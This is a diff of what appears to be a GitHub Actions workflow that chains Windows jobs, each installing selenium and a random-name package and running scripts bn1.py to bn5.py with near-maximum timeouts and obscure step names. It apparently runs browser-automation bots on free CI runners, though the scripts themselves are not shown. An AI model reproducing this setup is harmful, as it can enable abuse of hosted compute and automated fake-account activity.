@@ -28,7 +28,7 @@ jobs:
         pip install selenium
         pip install names
         pip3 install selenium
-        python3 bn.py
+        python3 bn1.py
         
   win-2:
     needs: win-1
@@ -80,7 +80,59 @@ jobs:
         pip install selenium
         pip install names
         pip3 install selenium
-        python3 bn.py
+        python3 bn2.py
+  win-6:
+    needs: win-5
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+         goc: [1.1]
+         flag: [kmn]  
+    timeout-minutes: 355
+    continue-on-error: true
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.goc }}
+    steps:
+    - name: stg2o ${{ matrix.goc }}
+      uses: actions/setup-go@v1
+    - name: Stg3
+      uses: actions/checkout@v1
+    - name: finish
+      run: |
+        pip install selenium
+        pip install names
+        pip3 install selenium
+        python3 bn5.py
+        
+  win-5:
+    needs: win-4
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+         goc: [1.1]
+         flag: [kmn]  
+    timeout-minutes: 355
+    continue-on-error: true
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.goc }}
+    steps:
+    - name: stg2o ${{ matrix.goc }}
+      uses: actions/setup-go@v1
+    - name: Stg3
+      uses: actions/checkout@v1
+    - name: finish
+      run: |
+        pip install selenium
+        pip install names
+        pip3 install selenium
+        python3 bn4.py
+        
         
   win-4:
     needs: win-3
@@ -106,7 +158,7 @@ jobs:
         pip install selenium
         pip install names
         pip3 install selenium
-        python3 bn.py
+        python3 bn3.py
         
         
         
